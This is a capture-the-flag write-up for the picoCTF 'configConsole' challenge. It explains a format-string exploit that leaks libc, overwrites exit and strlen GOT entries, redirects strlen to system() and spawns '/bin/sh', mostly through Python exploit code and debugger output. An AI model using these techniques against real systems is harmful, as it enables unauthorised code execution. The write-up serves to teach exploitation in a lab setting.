# Level 3 - configConsole

```
Config Console
In order to configure the login messsage for all the users on the system, you've been given access to a configuration console. 
See if you can get a shell on shell2017.picoctf.com:47232.

HINTS

You can either see where libc is or modify the execution. 
Is there a way to get the vulnerability to run twice so that you can do both?
There's a place in libc that will give you a shell as soon as you jump to it. Try looking for execve.
```

The vulnerable piece of code is here:
```C
void set_exit_message(char *message) {
    if (!message) {
        printf("No message chosen\n");
        exit(1);
    }
    printf("Exit message set!\n");
    printf(message);   //<---------------------------HERE

    append_command('e', message);
    exit(0);
}
```
This is obviously a FSB. But there is a call to exit(0) right afterwards, so how can we get around this?

I did this by leaking a libc address and updating the GOT entry for exit() in one statement:
```python
  # Set the exit message, since that has the vulnerable printf()
  # First print out a leaked address to use. Then update write to GOT
  # to update the lower 2Bytes of the exit() address with something 
  # that doesn't do anything. Thereby just returning instead of exiting
  payload = 'e'
  payload += '_______'
  payload += p64(0x4141414141414141)
  payload += ' %25$p%{}c%19$hn '.format(int(0xb45-14))
  payload += 'AAAAA'
  payload += p64(0x601258)
  print r.sendline(payload)
```

Before printf is called:
`0x601258 (exit@got.plt) —▸ 0x400736 (exit@plt+6)`
After printf is called:
`0x601258 (exit@got.plt) —▸ 0x400b45 (main+114)`

So whenever exit() is called it will jump back into main+114 instead.

So now we have two things:
* Libc leaked address
* Ability to do more calls to the vulnerable printf

The hint says that there is a place in libc that we can jump to that will give you a shell. 
That's nice and all, but is very libc binary specific. Let's do it in a more robust way.

Next, we want to find a function that will take a pointer, preferably to a string we control.
```C
void set_prompt(char *prompt) {
    if (!prompt) {
        printf("No prompt chosen\n");
        exit(1);
    }
    if (strlen(prompt) > 10) {                //<------------ This looks perfect
        printf("Prompt too long\n");
        exit(1);
    }
    printf("Login prompt set to: %10s\n", prompt);

    append_command('p', prompt);
    exit(0);
}
```
Great, and `strlen()` is only used here, so we're safe to update that with multiple writes
```python
  #Start overwriting the GOT entry for strlen()
  #update it with the address of system()
  wait_for_prompt(r)
  payload  = 'e '
  payload += '%{}c%17$hn '.format(int(addr1))
  payload += 'A'*(8)
  payload += p64(0x601210)

  print r.sendline(payload)

  payload  = 'e '
  payload += '%{}c%18$hn '.format(int(addr2))
  payload += 'A'*(8+8)
  payload += p64(0x601210+2)

  print r.sendline(payload)

  payload  = 'e '
  payload += '%{}c%19$hn '.format(int(addr3))
  payload += 'A'*(8+8+8)
  payload += p64(0x601210+4)

  print r.sendline(payload)
```

Now at this point, if we look at the GOT entry for strlen() we have:
`0x601210 (strlen@got.plt) —▸ 0x7fb0701b3490 (system)`
Perfect. Now we just have to pass the right parameter to `system()`

```python
  # strlen() in GOT is now overwritten
  # since prompt calls strlen on string passed
  # we can input string directly here
  print r.sendline('p /bin/sh')
  print "You should now have shell"
  
  # Drop to interactive console
  r.interactive()
```

Full exploit code in the [exploit.py](exploit.py) file.
